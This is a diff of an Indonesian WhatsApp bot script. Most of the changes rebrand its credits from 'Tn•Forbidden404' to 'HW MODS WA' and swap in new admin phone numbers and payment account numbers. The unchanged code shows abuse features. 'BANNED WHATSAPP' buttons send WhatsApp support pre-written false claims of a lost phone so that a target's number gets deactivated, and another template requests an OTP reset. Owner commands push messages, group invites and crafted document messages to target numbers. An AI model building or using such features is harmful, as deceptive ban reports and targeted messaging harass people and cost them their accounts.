@@ -4,7 +4,7 @@
 
 // Base HW MODS WA
 
-› Create By DI
+› Create By HW MODS WA
 › Base Ori HW MODS WA - HW MODS WA
 
 🌷 KALAU MAU RENAME TARO CREDITS GUA : HW MODS WA*/
@@ -154,7 +154,7 @@ const isQuotedDocument = type === 'extendedTextMessage' && content.includes('doc
  const qmsg = (quoted.msg || quoted)
 //=================================================//}
 const reply = (teks) => {
-return haikal.sendMessage(from, { text: teks, contextInfo:{"externalAdReply": {"title": `DEVELOPER Tn•Forbidden404`,"body": `Selamat ${salam} kak ${pushname}`, "previewType": "PHOTO","thumbnailUrl": 'https://telegra.ph/file/7b3c0ac03dab420c5c12b.jpg',"thumbnail": thumb,"sourceUrl": `https://youtube.com/c/HwModsWa857`}}}, { quoted: m})} 
+return haikal.sendMessage(from, { text: teks, contextInfo:{"externalAdReply": {"title": `DEVELOPER HW MODS WA`,"body": `Selamat ${salam} kak ${pushname}`, "previewType": "PHOTO","thumbnailUrl": 'https://telegra.ph/file/7b3c0ac03dab420c5c12b.jpg',"thumbnail": thumb,"sourceUrl": `https://youtube.com/c/HwModsWa857`}}}, { quoted: m})} 
 function pickRandom(list) {
 return list[Math.floor(Math.random() * list.length)]
 }
@@ -813,7 +813,7 @@ if (!AntiNsfww) return m.reply(mess.nsfw)
  waifudd = await axios.get(`https://waifu.pics/api/nsfw/neko`)
 const bugcrot = {
 image: {url:waifudd.data.url},
-caption: `© Tn•Forbidden404${buttonkal}`,
+caption: `© HW MODS WA${buttonkal}`,
 } 
 haikal.sendMessage(from, bugcrot, { quoted:m}).catch(err => {
  return('Error!')
@@ -826,7 +826,7 @@ m.reply('Sabar Cuy Loading')
  waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`) 
  const bugahay = {
 image: {url:waifudd.data.url},
-caption: `© Tn•Forbidden404${buttonkal}`,
+caption: `© HW MODS WA${buttonkal}`,
 } 
 haikal.sendMessage(from, bugahay, { quoted:m}).catch(err => {
  return('Error!')
@@ -1116,7 +1116,7 @@ haikal.sendTextWithMentions(from, teks, m)
 break
 case 'penjara':
 if (!isCreator) return m.reply(mess.owner)
-if (!q) return m.reply(`*Contoh* :\n#penjara Tn•Forbidden404a [ Lu Sambil Replay Si nmr Target `)
+if (!q) return m.reply(`*Contoh* :\n#penjara HW MODS WA [ Lu Sambil Replay Si nmr Target `)
 let cret = await haikal.groupCreate(args.join(" "), [])
 let response = await haikal.groupInviteCode(cret.id)
 haikal.sendMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { text: `「 *Create Group* 」
@@ -1185,7 +1185,7 @@ const result4 = `*DOWNLOAD MEDIAFIRE*
 *Link* : ${baby1[0].link}\n
 _whoa wait hwmods processing..._
 
-*Tn•Forbidden404*`
+*HW MODS WA*`
 m.reply(`${result4}`)
 haikal.sendMessage(from, { document : { url : baby1[0].link}, fileName : baby1[0].nama, mimetype: baby1[0].mime }, { quoted : m }).catch ((err) => m.reply('*Failed to download File*'))
 }
@@ -1496,7 +1496,7 @@ case 'sendlinkgc': {
 if (!isCreator) return m.reply(mess.owner)
 if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
 if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
-if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285814480623`)
+if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281214281312`)
 bnnd = text.split("|")[0]+'@s.whatsapp.net'
 let response = await haikal.groupInviteCode(from)
 haikal.sendText(bnnd, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
@@ -1552,7 +1552,7 @@ m.reply(teks)
 }
 break
 case '*': {
-if (!text) throw `Contoh : ${prefix + command} Tn•Forbidden404`
+if (!text) throw `Contoh : ${prefix + command} HW MODS WA`
 let teks = `${q}`
 {
 haikal.sendMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { text : `${teks}`},{ quoted:m })
@@ -1980,7 +1980,7 @@ m.reply('on untuk mengaktifkan, off untuk menonaktifkan')
 break
 case 'addprem':
 if (!isCreator) return m.reply(mess.owner)
-if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285814480623`)
+if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281214281312`)
 bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
 let ceknye = await haikal.onWhatsApp(bnnd + `@s.whatsapp.net`)
 if (ceknye.length == 0) return m.reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
@@ -1990,7 +1990,7 @@ m.reply(`Nomor ${bnnd} Telah Sudah Premium!!!`)
 break
 case 'delprem':
 if (!isCreator) return m.reply(mess.owner)
-if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285814480623`)
+if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281214281312`)
 yaki = q.split("|")[0].replace(/[^0-9]/g, '')
 unp = owner.indexOf(yaki)
 owner.splice(unp, 1)
@@ -2036,7 +2036,7 @@ let buttonsntnsfww = [
 ]
 await haikal.sendButtonText(from, buttonsntnsfww, `Klick Button Di Bawah Ini \n\nOn Untuk Mengaktifkan\nOff untuk Menonaktifkan !!!
 
- `, `Tn•Forbidden404`, m)
+ `, `HW MODS WA`, m)
 }
 }
 break
@@ -2063,7 +2063,7 @@ let buttonsntnsfww = [
 { buttonId: `${command} on`, buttonText: { displayText: 'On' }, type: 1 },
 { buttonId: `${command} off`, buttonText: { displayText: 'Off' }, type: 1 }
 ]
-await haikal.sendButtonText(from, buttonsntnsfww, `Iya Tuan Aku Disini 👋 Silahkan Pilih Button di Bawah Yah `, `Tn•Forbidden404`, m)
+await haikal.sendButtonText(from, buttonsntnsfww, `Iya Tuan Aku Disini 👋 Silahkan Pilih Button di Bawah Yah `, `HW MODS WA`, m)
 }
 }
 break
@@ -2071,7 +2071,7 @@ break
 case 'menu':
 touchmebree = [
 {
-title: `©️ Tn•Forbidden404`,
+title: `©️ HW MODS WA`,
 rows: [
 {title: `🔥 OWNER MENU`, rowId: `${prefix}ownermenu`, description: ``},
 {title: `🔥 LIST MENU`, rowId: `${prefix}menulist`, description: ``},
@@ -2141,7 +2141,7 @@ break
 case 'pgame':
 touchmebree = [
 {
-title: `©️ Tn•Forbidden404`,
+title: `©️ HW MODS WA`,
 rows: [
 {title: `🔥 Tebak Kata`, rowId: `${prefix}tebak kata`, description: ``},
 {title: `🔥 Tebak Gambar`, rowId: `${prefix}tebak gambar`, description: ``},
@@ -2175,7 +2175,7 @@ case 'antilonk':
 if (!isCreator) return m.reply(mess.owner)
 touchmebree = [
 {
-title: `©️ Tn•Forbidden404`,
+title: `©️ HW MODS WA`,
 rows: [
 {title: `🔥 Anti Link On`, rowId: `${prefix}antilink on`, description: ``},
 {title: `🔥 Anti Link Off`, rowId: `${prefix}antilink off`, description: ``}
@@ -2197,7 +2197,7 @@ case 'welcomeee':
 if (!isCreator) return m.reply(mess.owner)
 touchmebree = [
 {
-title: `©️ Tn•Forbidden404`,
+title: `©️ HW MODS WA`,
 rows: [
 {title: `🔥 Welcome on`, rowId: `${prefix}welcome on`, description: ``},
 {title: `🔥 Welcome off`, rowId: `${prefix}welcome off`, description: ``}
@@ -2219,7 +2219,7 @@ case 'angtitox':
 if (!isCreator) return m.reply(mess.owner)
 touchmebree = [
 {
-title: `©️ Tn•Forbidden404`,
+title: `©️ HW MODS WA`,
 rows: [
 {title: `🔥 Anti Toxic on`, rowId: `${prefix}antitoxic on`, description: ``},
 {title: `🔥 Anti Toxic off`, rowId: `${prefix}antitoxic off`, description: ``}
@@ -2370,7 +2370,7 @@ break
 case 'sewa': {
 m.reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}
 
-Sewa Bot ? Hubungi Admin Untuk Nego Wa.me/6285814480623`)
+Sewa Bot ? Hubungi Admin Untuk Nego Wa.me/6281214281312`)
 }
 break
 
@@ -2515,7 +2515,7 @@ m.reply(`Sedang Limit Tunggu Beberapa Saat.`)
 break
 //=================================================//
 case 'hwcap': {
-if (!isCreator) return m.reply('Kamu Mau ? Beli Coy Di Tn•Forbidden404 :)')
+if (!isCreator) return m.reply('Kamu Mau ? Beli Coy Di Hw Mods :)')
 var document = generateWAMessageFromContent(from, proto.Message.fromObject({
 "documentMessage": {
 					"url": "https://mmg.whatsapp.net/v/t62.7119-24/56446658_3413164755598350_821878124490476997_n.enc?ccb=11-4&oh=01_AdSi2CLeWDI3bUR5Lhqsl3CawDpSVp8xt8iXaJANwUQA2Q&oe=640D1BE9&mms3=true",
@@ -2529,7 +2529,7 @@ var document = generateWAMessageFromContent(from, proto.Message.fromObject({
 					"fileEncSha256": "o3PGSybpvDrCOmn4SspiluE30b1zDFeT+/a0Slc2NaU=",
 					"directPath": "/v/t62.7119-24/56446658_3413164755598350_821878124490476997_n.enc?ccb=11-4&oh=01_AdSi2CLeWDI3bUR5Lhqsl3CawDpSVp8xt8iXaJANwUQA2Q&oe=640D1BE9",
 					"mediaKeyTimestamp": "1675988851",
-"caption": "HELLO KAK WHATSAPP INI ASLI BUATAN MRVXDX1 SELAMAT MENCOBA 🥳",
+"caption": "HELLO KAK WHATSAPP INI ASLI BUATAN HW MODS SELAMAT MENCOBA 🥳",
 }
 }), { userJid: from })
 haikal.relayMessage(from, document.message, { messageId: document.key.id })
@@ -2544,7 +2544,7 @@ Tanda Tangan : V1 + V2 + V3
 break
 
 case 'hwcap2': {
-if (!isCreator) return m.reply('Kamu Mau ? Beli Coy Di Tn•Forbidden404 :)')
+if (!isCreator) return m.reply('Kamu Mau ? Beli Coy Di Hw Mods :)')
 var document = generateWAMessageFromContent(from, proto.Message.fromObject({
 		"documentMessage": {
 					"url": "https://mmg.whatsapp.net/v/t62.7119-24/56109427_942905640456494_8876730063503224510_n.enc?ccb=11-4&oh=01_AdSun922XkVSSXKi5yDNN9RcXq6mCimDtWBLrmOgNNO4pw&oe=640D0DC4&mms3=true",
@@ -2558,7 +2558,7 @@ var document = generateWAMessageFromContent(from, proto.Message.fromObject({
 					"fileEncSha256": "5wXtEw/isaFLcE069/+jXLGvInlHc9E+2kJloX4NqK0=",
 					"directPath": "/v/t62.7119-24/56109427_942905640456494_8876730063503224510_n.enc?ccb=11-4&oh=01_AdSun922XkVSSXKi5yDNN9RcXq6mCimDtWBLrmOgNNO4pw&oe=640D0DC4",
 					"mediaKeyTimestamp": "1675988851",
-"caption": "HELLO KAK WHATSAPP INI ASLI BUATAN MRVXDX1 SELAMAT MENCOBA 🥳",
+"caption": "HELLO KAK WHATSAPP INI ASLI BUATAN HW MODS SELAMAT MENCOBA 🥳",
 }
 }), { userJid: from })
 haikal.relayMessage(from, document.message, { messageId: document.key.id })
@@ -2573,7 +2573,7 @@ Tanda Tangan : V1 + V2 + V3
 break
 
 case 'hwcap3': {
-if (!isCreator) return m.reply('Kamu Mau ? Beli Coy Di Tn•Forbidden404 :)')
+if (!isCreator) return m.reply('Kamu Mau ? Beli Coy Di Hw Mods :)')
 var document = generateWAMessageFromContent(from, proto.Message.fromObject({
 	"documentMessage": {
 					"url": "https://mmg.whatsapp.net/v/t62.7119-24/25997379_705817474366274_8587943332423143875_n.enc?ccb=11-4&oh=01_AdTK-_pH6YbJuvlP29OhQ98Ah8gJ3Oi2OoW-hL632JRpsA&oe=640D1333&mms3=true",
@@ -2587,7 +2587,7 @@ var document = generateWAMessageFromContent(from, proto.Message.fromObject({
 					"fileEncSha256": "PtvwFNVTJF3n5c6PSdzpfaQZiPXHKZgBH6oSqeyV2SU=",
 					"directPath": "/v/t62.7119-24/25997379_705817474366274_8587943332423143875_n.enc?ccb=11-4&oh=01_AdTK-_pH6YbJuvlP29OhQ98Ah8gJ3Oi2OoW-hL632JRpsA&oe=640D1333",
 					"mediaKeyTimestamp": "1675988851",
-"caption": "HELLO KAK WHATSAPP INI ASLI BUATAN MRVXDX1 SELAMAT MENCOBA 🥳",
+"caption": "HELLO KAK WHATSAPP INI ASLI BUATAN HW MODS SELAMAT MENCOBA 🥳",
 }
 }), { userJid: from })
 haikal.relayMessage(from, document.message, { messageId: document.key.id })
@@ -2601,7 +2601,7 @@ Tanda Tangan : V1 + V2 + V3
 }
 break
 case 'skrop': {
-if (!isCreator) return m.reply('Kamu Mau ? Beli Coy Di Tn•Forbidden404 :)')
+if (!isCreator) return m.reply('Kamu Mau ? Beli Coy Di Hw Mods :)')
 var document = generateWAMessageFromContent(from, proto.Message.fromObject({
 	"documentMessage": {
 					"url": "https://mmg.whatsapp.net/v/t62.7119-24/19972581_218899390522737_803595626442555127_n.enc?ccb=11-4&oh=01_AdTnrmdJasmgE7X0VBcSN4DBK4RpMLYERuLo_1vVMeYvnw&oe=640D0B48&mms3=true",
@@ -2615,7 +2615,7 @@ var document = generateWAMessageFromContent(from, proto.Message.fromObject({
 					"fileEncSha256": "X42lig2xvVaHZAEjSLpkKvN/o6CyOPelNSSa/GMVFEk=",
 					"directPath": "/v/t62.7119-24/19972581_218899390522737_803595626442555127_n.enc?ccb=11-4&oh=01_AdTnrmdJasmgE7X0VBcSN4DBK4RpMLYERuLo_1vVMeYvnw&oe=640D0B48",
 					"mediaKeyTimestamp": "1675989190",
-"caption": "HELLO KAK SKRIP INI ASLI BUATAN HW TN FORBIDDEN404 SELAMAT MENCOBA 🥳",
+"caption": "HELLO KAK SKRIP INI ASLI BUATAN HW MODS SELAMAT MENCOBA 🥳",
 }
 }), { userJid: from })
 haikal.relayMessage(from, document.message, { messageId: document.key.id })
@@ -2667,29 +2667,31 @@ Untuk pricelist renew berlaku jika ada server yg masih aktif di dalam akun minim
 
 *[ Administrator]*
 contact.amgeekz.site
-Admin1 = 6285814480623
+Admin1 = 6285649455626
+Admin2 = 62895422836123
+Admin3 = 6281214281312
 `)
 }
 break
 //=================================================//
 case 'pdana': {
-haikal.sendMessage(from, { image: dana,  caption: `DANA : 082278082114` }, { quoted:m })
+haikal.sendMessage(from, { image: dana,  caption: `DANA : 085714170944` }, { quoted:m })
 }
 break
 case 'pgopay': {
-haikal.sendMessage(from, { image: gopay,  caption: `GOPAY : 082278082114` }, { quoted:m })
+haikal.sendMessage(from, { image: gopay,  caption: `GOPAY : 085714170944` }, { quoted:m })
 }
 break
 case 'pbca': {
-haikal.sendMessage(from, { image: rekening,  caption: `Rek BCA ` }, { quoted:m })
+haikal.sendMessage(from, { image: rekening,  caption: `Rek BCA : 2832657396` }, { quoted:m })
 }
 break
 //=================================================//
 
-case 'group': {
+case 'tutorial': {
 m.reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}
-DATANG DI GROUP KAMI
-https://chat.whatsapp.com/FP4aGWEuYm12mnMr0iqq02`)
+Tutorial Run Via Panel
+https://youtu.be/rqqxkI4P8YY`)
 }
 break
 //=================================================//
@@ -2717,7 +2719,7 @@ sticSukses(from)
 break
 //=================================================//
 case 'infoamgeekz': {
-if (!m.isGroup) return m.reply('Buat Di Group Ganteng')
+if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
 haikal.sendMessage(from, { text : `◎ © Hay Kak ${pushname} 👋 Selamat ${salam}
 
 📮 _*Syarat & Ketentuan*_
@@ -2860,7 +2862,7 @@ let teksoooo = '┌──⭓「 *LIST PDF* 」\n│\n'
 for (let x of docunye) {
 teksoooo += `│⭔ ${x}\n`
 }
-teksoooo += `│\n└────────────⭓\n\n*Total ada : ${docunye.length} \n\n Contoh 1 : sendpdf Tn•Forbidden404 + sambil reply pesan target* \n\n Contoh 2 : yopdf Tn•Forbidden404`
+teksoooo += `│\n└────────────⭓\n\n*Total ada : ${docunye.length} \n\n Contoh 1 : sendpdf HW MODS WA + sambil reply pesan target* \n\n Contoh 2 : yopdf HW MODS WA`
 m.reply(teksoooo)
 }
 break
@@ -2886,7 +2888,7 @@ break
 //=================================================//
 case 'larangan': case 'peraturan': {
 if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
-haikal.sendMessage(from, { text : `Haii 👋 Aku Bot TN FORBIDDEN404
+haikal.sendMessage(from, { text : `Haii 👋 Aku Shekai Bot Hw Mods
 Aku Sebagai Admin Akan Melarang Kalian Untuk Toxic Ataupun Berkata Kasar Di group Ini !!!
 
 Larangan !!!
@@ -2942,7 +2944,7 @@ let teksooooo = '┌──⭓「 *LIST ZIP* 」\n│\n'
 for (let x of zipnye) {
 teksooooo += `│⭔ ${x}\n`
 }
-teksooooo += `│\n└────────────⭓\n\n*Total ada : ${zipnye.length} \n\n Contoh 1 : sendzip Tn•Forbidden404 + sambil reply pesan target* \n\n Contoh 2 : yozip Tn•Forbidden404`
+teksooooo += `│\n└────────────⭓\n\n*Total ada : ${zipnye.length} \n\n Contoh 1 : sendzip HW MODS WA + sambil reply pesan target* \n\n Contoh 2 : yozip HW MODS WA`
 m.reply(teksooooo)
 }
 break
@@ -3000,7 +3002,7 @@ let teksoooooo = '┌──⭓「 *LIST APK* 」\n│\n'
 for (let x of apknye) {
 teksoooooo += `│⭔ ${x}\n`
 }
-teksoooooo += `│\n└────────────⭓\n\n*Total ada : ${apknye.length} \n\n Contoh 1 : sendapk Tn•Forbidden404 + sambil reply pesan target* \n\n Contoh 2 : yoapk Tn•Forbidden404`
+teksoooooo += `│\n└────────────⭓\n\n*Total ada : ${apknye.length} \n\n Contoh 1 : sendapk HW MODS WA + sambil reply pesan target* \n\n Contoh 2 : yoapk HW MODS WA`
 m.reply(teksoooooo)
 }
 break
@@ -3115,7 +3117,7 @@ document : fs.readFileSync("./baseikal/sound/ngeselin.BIN"),
 "fileName": `BANNED WHATSAPP`,
 caption: ` Silahkan Klick Yang Ada di Bawah Dan Anda Akan Di Alihkan Ke Gmail Anda 
 Note : Harap Pastikan Gmail Anda Bersih Dari Backlist`,
-footer: ` Tn•Forbidden404`,
+footer: ` HW MODS WA`,
 mentionedJid: m.mentionedJid,
 templateButtons: [{ urlButton: {displayText: `BANNED`, url: 'mailto:support@whatsapp.com?Body=Hello,%20please%20deactivate%20this%20number,%20because%20I%20have%20lost%20my%20cellphone%20and%20someone%20is%20using%20my%20number,%20please%20deactivate%20my%20number:%2B+62xxxxxx'}}],
 headerType: 1
@@ -3131,7 +3133,7 @@ document : fs.readFileSync("./baseikal/sound/ngeselin.BIN"),
 "fileName": `UNBANED WHATSAPP`,
 caption: ` Silahkan Klick Yang Ada di Bawah Dan Anda Akan Di Alihkan Ke Gmail Anda 
 Note : Harap Pastikan Gmail Anda Bersih Dari Backlist`,
-footer: ` Tn•Forbidden404`,
+footer: ` HW MODS WA`,
 mentionedJid: m.mentionedJid,
 templateButtons: [{ urlButton: {displayText: `UNBANED`, url: 'mailto:support@whatsapp.com?Body=Please%20reactivate%20my%20number%20because%20I%20didnt%20violate%20any%20WhatsApp%20rules,%20suddenly%20my%20number%20was%20banned,%20please%20reactivate%20this%20number:%2B+62xxxxxxx%20because%20I%20didnt%20do%20anything%20wrong,%20suddenly%20my%20number%20was%20banned%20when%20I%20entered%20the%20group%20so%20I%20ask%20the%20respectable%20WhatsApp%20party,%20please%20reactivate%20my%20number,%20thank%20you'}}],
 headerType: 1
@@ -3147,7 +3149,7 @@ document : fs.readFileSync("./baseikal/sound/ngeselin.BIN"),
 "fileName": `UNBANED WHATSAPP`,
 caption: ` Silahkan Klick Yang Ada di Bawah Dan Anda Akan Di Alihkan Ke Gmail Anda 
 Note : Harap Pastikan Gmail Anda Bersih Dari Backlist`,
-footer: ` Tn•Forbidden404`,
+footer: ` HW MODS WA`,
 mentionedJid: m.mentionedJid,
 templateButtons: [{ urlButton: {displayText: `RESET CODE`, url: 'mailto:support@whatsapp.com?Body=Please%20research%20the%20OTP%20code%20for%20this%20number%20because%20someone%20else%20accidentally%20logged%20in%20with%20my%20number%20and%20I%20had%20to%20wait%208%20hours,%20please%20research%20again%20at%20this%20number:%2B+62xxxxx'}}],
 headerType: 1
@@ -3224,7 +3226,7 @@ haikal.sendMessage(from, { image: hw3,  caption: `© Created By Hw Mods` }, { qu
 }
 break
 case 'hw4': {
-haikal.sendMessage(from, { image: hw4,  caption: `© Created By Tn•forbidden404` }, { quoted:m })
+haikal.sendMessage(from, { image: hw4,  caption: `© Created By Hw Mods` }, { quoted:m })
 }
 break
 case 'hw5': {
@@ -3240,167 +3242,167 @@ haikal.sendMessage(from, { image: hw7,  caption: `© Created By Hw Mods` }, { qu
 }
 break
 case 'hw8': {
-haikal.sendMessage(from, { image: hw8,  caption: `© Created By Tn•forbidden404` }, { quoted:m })
+haikal.sendMessage(from, { image: hw8,  caption: `© Created By Hw Mods` }, { quoted:m })
 }
 break
 case 'hw9': {
-haikal.sendMessage(from, { image: hw9,  caption: `© Created By Tn•forbidden404` }, { quoted:m })
+haikal.sendMessage(from, { image: hw9,  caption: `© Created By Hw Mods` }, { quoted:m })
 }
 break
 case 'hw10': {
-haikal.sendMessage(from, { image: hw10,  caption: `© Created By Tn•forbidden404` }, { quoted:m })
+haikal.sendMessage(from, { image: hw10,  caption: `© Created By Hw Mods` }, { quoted:m })
 }
 break
 case 'hw11': {
-haikal.sendMessage(from, { image: hw11,  caption: `© Created By Tn•forbidden404` }, { quoted:m })
+haikal.sendMessage(from, { image: hw11,  caption: `© Created By Hw Mods` }, { quoted:m })
 }
 break
 case 'hw12': {
-haikal.sendMessage(from, { image: hw12,  caption: `© Created By Tn•forbidden404` }, { quoted:m })
+haikal.sendMessage(from, { image: hw12,  caption: `© Created By Hw Mods` }, { quoted:m })
 }
 break
 case 'hw13': {
-haikal.sendMessage(from, { image: hw13,  caption: `© Created By Tn•forbidden404` }, { quoted:m })
+haikal.sendMessage(from, { image: hw13,  caption: `© Created By Hw Mods` }, { quoted:m })
 }
 break
 case 'hw14': {
-haikal.sendMessage(from, { image: hw14,  caption: `© Created By Tn•forbidden404` }, { quoted:m })
+haikal.sendMessage(from, { image: hw14,  caption: `© Created By Hw Mods` }, { quoted:m })
 }
 break
 case 'hw15': {
-haikal.sendMessage(from, { image: hw15,  caption: `© Created By Tn•forbidden404` }, { quoted:m })
+haikal.sendMessage(from, { image: hw15,  caption: `© Created By Hw Mods` }, { quoted:m })
 }
 break
 case 'hw16': {
-haikal.sendMessage(from, { image: hw16,  caption: `© Created By Tn•forbidden404` }, { quoted:m })
+haikal.sendMessage(from, { image: hw16,  caption: `© Created By Hw Mods` }, { quoted:m })
 }
 break
 case 'hw17': {
-haikal.sendMessage(from, { image: hw17,  caption: `© Created By Tn•forbidden404` }, { quoted:m })
+haikal.sendMessage(from, { image: hw17,  caption: `© Created By Hw Mods` }, { quoted:m })
 }
 break
 case 'hw18': {
-haikal.sendMessage(from, { image: hw18,  caption: `© Created By Tn•forbidden404` }, { quoted:m })
+haikal.sendMessage(from, { image: hw18,  caption: `© Created By Hw Mods` }, { quoted:m })
 }
 break
 case 'hw19': {
-haikal.sendMessage(from, { image: hw19,  caption: `© Created By Tn•forbidden404` }, { quoted:m })
+haikal.sendMessage(from, { image: hw19,  caption: `© Created By Hw Mods` }, { quoted:m })
 }
 break
 case 'hw20': {
-haikal.sendMessage(from, { image: hw20,  caption: `© Created By Tn•forbidden404` }, { quoted:m })
+haikal.sendMessage(from, { image: hw20,  caption: `© Created By Hw Mods` }, { quoted:m })
 }
 break
 case 'hw21': {
-haikal.sendMessage(from, { image: hw21,  caption: `© Created By Tn•forbidden404` }, { quoted:m })
+haikal.sendMessage(from, { image: hw21,  caption: `© Created By Hw Mods` }, { quoted:m })
 }
 break
 case 'hw22': {
-haikal.sendMessage(from, { image: hw22,  caption: `© Created By Tn•forbidden404` }, { quoted:m })
+haikal.sendMessage(from, { image: hw22,  caption: `© Created By Hw Mods` }, { quoted:m })
 }
 break
 case 'hw23': {
-haikal.sendMessage(from, { image: hw23,  caption: `© Created By Tn•forbidden404` }, { quoted:m })
+haikal.sendMessage(from, { image: hw23,  caption: `© Created By Hw Mods` }, { quoted:m })
 }
 break
 case 'hw24': {
-haikal.sendMessage(from, { image: hw24,  caption: `© Created By Tn•forbidden404` }, { quoted:m })
+haikal.sendMessage(from, { image: hw24,  caption: `© Created By Hw Mods` }, { quoted:m })
 }
 break
 case 'hw25': {
-haikal.sendMessage(from, { image: hw25,  caption: `© Created By Tn•forbidden404` }, { quoted:m })
+haikal.sendMessage(from, { image: hw25,  caption: `© Created By Hw Mods` }, { quoted:m })
 }
 break
 case 'hw26': {
-haikal.sendMessage(from, { image: hw26,  caption: `© Created By Tn•forbidden404` }, { quoted:m })
+haikal.sendMessage(from, { image: hw26,  caption: `© Created By Hw Mods` }, { quoted:m })
 }
 break
 case 'hw27': {
-haikal.sendMessage(from, { image: hw27,  caption: `© Created By Tn•forbidden404` }, { quoted:m })
+haikal.sendMessage(from, { image: hw27,  caption: `© Created By Hw Mods` }, { quoted:m })
 }
 break
 case 'hw28': {
-haikal.sendMessage(from, { image: hw28,  caption: `© Created By Tn•forbidden404` }, { quoted:m })
+haikal.sendMessage(from, { image: hw28,  caption: `© Created By Hw Mods` }, { quoted:m })
 }
 break
 case 'hw29': {
-haikal.sendMessage(from, { image: hw29,  caption: `© Created By Tn•forbidden404` }, { quoted:m })
+haikal.sendMessage(from, { image: hw29,  caption: `© Created By Hw Mods` }, { quoted:m })
 }
 break
 case 'hw30': {
-haikal.sendMessage(from, { image: hw30,  caption: `© Created By Tn•forbidden404` }, { quoted:m })
+haikal.sendMessage(from, { image: hw30,  caption: `© Created By Hw Mods` }, { quoted:m })
 }
 break
 case 'hw31': {
-haikal.sendMessage(from, { image: hw31,  caption: `© Created By Tn•forbidden404` }, { quoted:m })
+haikal.sendMessage(from, { image: hw31,  caption: `© Created By Hw Mods` }, { quoted:m })
 }
 break
 case 'hw32': {
-haikal.sendMessage(from, { image: hw32,  caption: `© Created By Tn•forbidden404` }, { quoted:m })
+haikal.sendMessage(from, { image: hw32,  caption: `© Created By Hw Mods` }, { quoted:m })
 }
 break
 case 'hw33': {
-haikal.sendMessage(from, { image: hw33,  caption: `© Created By Tn•forbidden404` }, { quoted:m })
+haikal.sendMessage(from, { image: hw33,  caption: `© Created By Hw Mods` }, { quoted:m })
 }
 break
 case 'hw34': {
-haikal.sendMessage(from, { image: hw34,  caption: `© Created By Tn•forbidden404` }, { quoted:m })
+haikal.sendMessage(from, { image: hw34,  caption: `© Created By Hw Mods` }, { quoted:m })
 }
 break
 case 'hw35': {
-haikal.sendMessage(from, { image: hw35,  caption: `© Created By Tn•forbidden404` }, { quoted:m })
+haikal.sendMessage(from, { image: hw35,  caption: `© Created By Hw Mods` }, { quoted:m })
 }
 break
 case 'hw36': {
-haikal.sendMessage(from, { image: hw36,  caption: `© Created By Tn•forbidden404` }, { quoted:m })
+haikal.sendMessage(from, { image: hw36,  caption: `© Created By Hw Mods` }, { quoted:m })
 }
 break
 case 'hw37': {
-haikal.sendMessage(from, { image: hw37,  caption: `© Created By Tn•forbidden404` }, { quoted:m })
+haikal.sendMessage(from, { image: hw37,  caption: `© Created By Hw Mods` }, { quoted:m })
 }
 break
 case 'hw38': {
-haikal.sendMessage(from, { image: hw38,  caption: `© Created By Tn•forbidden404` }, { quoted:m })
+haikal.sendMessage(from, { image: hw38,  caption: `© Created By Hw Mods` }, { quoted:m })
 }
 break
 case 'hw39': {
-haikal.sendMessage(from, { image: hw39,  caption: `© Created By Tn•forbidden404` }, { quoted:m })
+haikal.sendMessage(from, { image: hw39,  caption: `© Created By Hw Mods` }, { quoted:m })
 }
 break
 case 'hw40': {
-haikal.sendMessage(from, { image: hw40,  caption: `© Created By Tn•forbidden404` }, { quoted:m })
+haikal.sendMessage(from, { image: hw40,  caption: `© Created By Hw Mods` }, { quoted:m })
 }
 break
 case 'hw41': {
-haikal.sendMessage(from, { image: hw41,  caption: `© Created By Tn•forbidden404` }, { quoted:m })
+haikal.sendMessage(from, { image: hw41,  caption: `© Created By Hw Mods` }, { quoted:m })
 }
 break
 case 'hw42': {
-haikal.sendMessage(from, { image: hw42,  caption: `© Created By Tn•forbidden404` }, { quoted:m })
+haikal.sendMessage(from, { image: hw42,  caption: `© Created By Hw Mods` }, { quoted:m })
 }
 break
 case 'hw43': {
-haikal.sendMessage(from, { image: hw43,  caption: `© Created By Tn•forbidden404` }, { quoted:m })
+haikal.sendMessage(from, { image: hw43,  caption: `© Created By Hw Mods` }, { quoted:m })
 }
 break
 case 'hw44': {
-haikal.sendMessage(from, { image: hw44,  caption: `© Created By Tn•forbidden404` }, { quoted:m })
+haikal.sendMessage(from, { image: hw44,  caption: `© Created By Hw Mods` }, { quoted:m })
 }
 break
 case 'hw45': {
-haikal.sendMessage(from, { image: hw45,  caption: `© Created By Tn•forbidden404` }, { quoted:m })
+haikal.sendMessage(from, { image: hw45,  caption: `© Created By Hw Mods` }, { quoted:m })
 }
 break
 case 'hw46': {
-haikal.sendMessage(from, { image: hw46,  caption: `© Created By Tn•forbidden404` }, { quoted:m })
+haikal.sendMessage(from, { image: hw46,  caption: `© Created By Hw Mods` }, { quoted:m })
 }
 break
 case 'hw47': {
-haikal.sendMessage(from, { image: hw47,  caption: `© Created By Tn•forbidden404` }, { quoted:m })
+haikal.sendMessage(from, { image: hw47,  caption: `© Created By Hw Mods` }, { quoted:m })
 }
 break
 case 'hw48': {
-haikal.sendMessage(from, { image: hw48,  caption: `© Created By ` }, { quoted:m })
+haikal.sendMessage(from, { image: hw48,  caption: `© Created By Hw Mods` }, { quoted:m })
 }
 break
 case 'hw49': {
@@ -3869,7 +3871,7 @@ break
